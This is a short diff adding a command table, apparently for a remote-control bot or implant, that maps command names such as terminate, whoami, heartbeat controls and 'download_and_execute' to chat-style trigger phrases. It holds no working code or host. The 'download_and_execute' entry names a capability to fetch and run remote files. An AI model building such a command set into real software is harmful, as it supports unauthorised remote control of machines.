@@ -1,0 +1,9 @@
+commands:
+ - terminate: gtfo
+ - whoami: who am i
+ - noheartbeat: be quiet
+ - heartbeat: start talking
+ - change_heartbeat: talk every
+  - amount: int
+ - download_and_execute: grab and execute
+  - filename: string
